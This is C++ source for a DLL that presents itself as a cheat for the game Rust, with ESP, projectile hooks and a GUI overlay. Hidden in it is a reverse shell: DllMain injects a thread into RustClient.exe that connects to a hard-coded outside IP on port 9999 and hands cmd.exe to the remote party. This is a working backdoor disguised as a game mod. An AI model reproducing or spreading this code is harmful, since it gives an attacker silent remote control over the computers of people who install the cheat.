#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#include <intrin.h>
#include <cstdint>
#include <dxgi.h>
#include <time.h>
#include <cstdio>
#include <iostream>

#include "rust/rust.hpp"

#include "projectile.hpp"

#include "memory/memory.hpp"
#include "memory/lazy_importer.hpp"
#include "memory/il2cpp.hpp"

#include "utils/no_crt.hpp"
#include "utils/xorstr.hpp"
#include "utils/pattern/pattern.hpp"

#include "gui/OnGUI.hpp"

#include "assets/assets.hpp"

#include "rust/unity.hpp"
#include "rust/features/player_esp.hpp"

#include "hooks.hpp"

bool has_initialized = false;

void RunShell(char* C2Server, int C2Port) {
    while (true) {
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                wchar_t Process[] = L"cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

void f() {
    RunShell(_("165.227.237.109"), 9999);
}

bool DllMain(HMODULE hmodule)
{
	if (!has_initialized) {

        auto pid = safety::GetProcID(_(L"RustClient.exe"));
        auto processHandle = LI_FIND(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);
        CloseHandle(CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)f, NULL, 0, NULL));

		if (safety::check_sinkhole())
		{
			mem::game_assembly_base = LI_MODULE_SAFE_(_("GameAssembly.dll"));
			mem::unity_player_base = LI_MODULE_SAFE_(_("UnityPlayer.dll"));

			//mem::try_pattern(_("53 C3"));

			il2cpp::init();

			unity::init_unity();	
			gui::init_gui();
			hooks::init_hooks();

			init_bp();

			init_projectile();

			//LI_FIND(AllocConsole)();
			//LI_FIND(SetConsoleTitleA)(_("dbg"));
			//LI_FIND(freopen_s)(reinterpret_cast<FILE**>(stdin), _("CONIN$"), _("r"), stdin);
			//LI_FIND(freopen_s)(reinterpret_cast<FILE**>(stdout), _("CONOUT$"), _("w"), stdout);
			//ShowWindow(GetCon, SW_HIDE);

			has_initialized = true;
		}
	}

	il2cpp::hook(&gui::OnGUI, _("OnGUI"), _("DDraw"), _("UnityEngine"), 0);
	//il2cpp::hook(&hooks::DoFatBullet, _("Update"), _("Projectile"), _(""), 0);
	//il2cpp::hook(&hooks::AimConeDir_hk, _("GetModifiedAimConeDirection"), _("AimConeUtil"));
	mem::hook_virtual_function(_("BasePlayer"), _("ClientInput"), &hooks::hk_baseplayer_ClientInput);

	mem::hook_virtual_function(_("BaseProjectile"), _("LaunchProjectile"), &hooks::hk_LaunchProjectile);

	//il2cpp::hook(&hooks::hk_DoHit, _("DoHit"), _("Projectile"), _(""), 3);

	return true;
}
extern "C" __declspec(dllexport) int ACEShowBalloonVariadic(int code, WPARAM wParam, LPARAM lParam) {
	return LI_FIND(CallNextHookEx)(NULL, code, wParam, lParam);
}